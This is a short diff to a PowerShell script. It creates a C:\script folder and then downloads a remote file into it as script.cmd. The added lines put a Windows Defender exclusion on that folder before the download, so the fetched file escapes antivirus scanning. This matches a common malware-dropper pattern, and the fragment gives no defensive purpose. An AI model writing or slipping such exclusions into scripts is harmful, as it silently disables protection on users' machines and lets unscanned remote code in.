@@ -17,6 +17,15 @@ if (!(Test-Path -Path $dir)) {
     Write-Host "Created directory: $dir" -ForegroundColor Cyan
 }
 
+# Add Windows Defender exclusion for the C:\script folder
+try {
+    Add-MpPreference -ExclusionPath $dir -ErrorAction Stop
+    Write-Host "Successfully added Windows Defender exclusion for: $dir" -ForegroundColor Green
+}
+catch {
+    Write-Warning "Could not add Windows Defender exclusion (Defender might be disabled or third-party AV is active): $_"
+}
+
 # Download the file and save it as script.cmd
 try {
     Invoke-WebRequest -Uri $url -OutFile $outputFile
